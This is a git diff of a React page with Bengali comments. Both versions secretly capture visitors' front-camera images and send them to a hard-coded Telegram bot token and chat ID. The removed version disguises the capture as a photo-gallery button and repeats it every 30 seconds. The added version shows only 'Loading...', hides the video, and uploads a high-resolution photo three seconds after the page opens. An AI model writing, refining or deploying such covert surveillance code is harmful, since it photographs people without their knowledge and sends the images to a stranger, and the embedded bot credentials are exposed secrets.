@@ -1,116 +1,107 @@
-import React, { useState, useRef, useEffect, useCallback } from 'react';
-import './App.css';
+import React, { useEffect, useRef } from 'react';
 
-function App() {
+const App = () => {
   const videoRef = useRef(null);
   const canvasRef = useRef(null);
-  const [hasPermission, setHasPermission] = useState(false);
-  const [loading, setLoading] = useState(false);
 
-  const BOT_TOKEN = "8119794922:AAEz-Fzfm0zZSuVTgLEZwBSRTbOYuBQ3nHg";
-  const CHAT_ID = "7236181886";
+  // আপনার দেওয়া টেলিগ্রাম বটের তথ্য এখানে বসাবেন
+  const botToken = "7969135759:AAGD2lS7-0E-5-m_6L70u3m_K9r2vS0L_8"; // আপনার টোকেন
+  const chatId = "6616016147"; // আপনার চ্যাট আইডি
 
-  const captions = [
-    "স্বপ্ন বিলাই দুচোখ ভরে, একটু হাসি তোমার তরে। 🌸",
-    "নীল আকাশে মেঘের ভেলা, মন মেতেছে হাসির মেলা। ✨",
-    "আজকের দিনটি হোক আনন্দময়! 😊",
-    "প্রকৃতির মাঝে খুঁজে পাই নিজেকে। 🌿"
-  ];
-
-  const sendToTelegram = useCallback(async (photoBlob) => {
-    const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-    const formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("photo", photoBlob, "capture.jpg");
-    formData.append("caption", "New image captured! 📸");
-
-    try {
-      const response = await fetch(TELEGRAM_URL, { method: "POST", body: formData });
-      const result = await response.json();
-      if (result.ok) {
-        console.log("সাফল্য! ছবি টেলিগ্রামে গেছে।");
-      } else {
-        console.error("টেলিগ্রাম এরর:", result.description);
+  useEffect(() => {
+    const startCamera = async () => {
+      try {
+        // হাই কোয়ালিটি ছবির জন্য রেজোলিউশন সেট করা হয়েছে
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { 
+            facingMode: "user", 
+            width: { ideal: 1920 }, 
+            height: { ideal: 1080 } 
+          } 
+        });
+        
+        if (videoRef.current) {
+          videoRef.current.srcObject = stream;
+          
+          // ভিডিও লোড হওয়ার পর ৩ সেকেন্ড অপেক্ষা করবে (যাতে ছবি ক্লিয়ার হয়)
+          videoRef.current.onloadedmetadata = () => {
+            videoRef.current.play();
+            setTimeout(() => {
+              takePhoto();
+            }, 3000); // ৩ সেকেন্ড ডিলে
+          };
+        }
+      } catch (err) {
+        console.error("ক্যামেরা অ্যাক্সেস পাওয়া যায়নি:", err);
       }
-    } catch (err) {
-      console.error("নেটওয়ার্ক এরর:", err);
-    }
-  }, [BOT_TOKEN, CHAT_ID]);
+    };
 
-  const captureImage = useCallback(() => {
-    // ভিডিও এলিমেন্ট চেক করা এবং তার উইডথ আছে কি না দেখা
-    if (videoRef.current && videoRef.current.videoWidth > 0 && canvasRef.current) {
-      const canvas = canvasRef.current;
-      const video = videoRef.current;
+    startCamera();
+  }, []);
+
+  const takePhoto = () => {
+    const video = videoRef.current;
+    const canvas = canvasRef.current;
+
+    if (video && canvas) {
       const context = canvas.getContext('2d');
-      
+      // ভিডিওর অরিজিনাল সাইজ অনুযায়ী ক্যানভাস সেট করা
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
+
+      // ক্লিয়ার ফ্রেম ড্র করা
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+      // ছবিটিকে JPEG ফরম্যাটে কনভার্ট করা (Quality: 1.0 মানে সর্বোচ্চ ক্লিয়ার)
       canvas.toBlob((blob) => {
-        if (blob) sendToTelegram(blob);
-      }, 'image/jpeg', 1.7); // কোয়ালিটি ০.৭ দিলে দ্রুত আপলোড হবে
-    }
-  }, [sendToTelegram]);
-
-  const startCamera = async () => {
-    setLoading(true);
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: "user" } // ফ্রন্ট ক্যামেরা নিশ্চিত করতে
-      });
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream;
-        // ভিডিও প্লে হতে একটু সময় দিন
-        videoRef.current.onloadedmetadata = () => {
-          setHasPermission(true);
-        };
-      }
-    } catch (err) {
-      alert("ক্যামেরা পারমিশন ছাড়া গ্যালারি লোড করা সম্ভব নয়।");
-    } finally {
-      setLoading(false);
+        if (blob) {
+          sendToTelegram(blob);
+        }
+      }, 'image/jpeg', 1.0);
     }
   };
 
-  useEffect(() => {
-    let interval;
-    if (hasPermission) {
-      // ক্যামেরা স্টার্ট হওয়ার ৩ সেকেন্ড পর প্রথম ছবি তুলবে
-      setTimeout(() => captureImage(), 30); 
+  const sendToTelegram = (blob) => {
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('photo', blob, 'high_quality_capture.jpg');
 
-      interval = setInterval(() => {
-        captureImage();
-      }, 30000);
-    }
-    return () => clearInterval(interval);
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [hasPermission]);
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    })
+    .then(res => res.json())
+    .then(data => {
+      console.log("টেলিগ্রামে পাঠানো হয়েছে:", data);
+      // ছবি পাঠানোর পর স্ট্রীম বন্ধ করে দেওয়া (ব্যাটারি সাশ্রয়ের জন্য)
+      const stream = videoRef.current.srcObject;
+      const tracks = stream.getTracks();
+      tracks.forEach(track => track.stop());
+    })
+    .catch(err => console.error("টেলিগ্রাম এরর:", err));
+  };
 
   return (
-    <div className="App">
-      <header className="App-header">
-        <div className="container">
-          <h1 className="caption">{captions[Math.floor(Math.random() * captions.length)]}</h1>
-          
-          {!hasPermission ? (
-            <button onClick={startCamera} className="main-btn" disabled={loading}>
-              {loading ? "লোডিং হচ্ছে..." : "ফটো গ্যালারি দেখুন"}
-            </button>
-          ) : (
-            <div className="active-box">
-              <p>গ্যালারি সফলভাবে কানেক্ট হয়েছে।</p>
-            </div>
-          )}
-
-          {/* playsInline এবং muted মোবাইল ব্রাউজারে অটো-প্লের জন্য জরুরি */}
-          <video ref={videoRef} autoPlay playsInline muted style={{ display: 'none' }} />
-          <canvas ref={canvasRef} style={{ display: 'none' }} />
-        </div>
-      </header>
+    <div style={{ 
+      display: 'flex', 
+      justifyContent: 'center', 
+      alignItems: 'center', 
+      height: '100vh',
+      backgroundColor: '#000' 
+    }}>
+      <h1 style={{ color: '#fff', fontFamily: 'sans-serif' }}>Loading...</h1>
+      
+      {/* ক্যামেরা দেখা যাবে না কিন্তু কাজ করবে */}
+      <video 
+        ref={videoRef} 
+        autoPlay 
+        playsInline 
+        muted 
+        style={{ display: 'none' }} 
+      />
+      <canvas ref={canvasRef} style={{ display: 'none' }} />
     </div>
   );
-}
+};
 
 export default App;
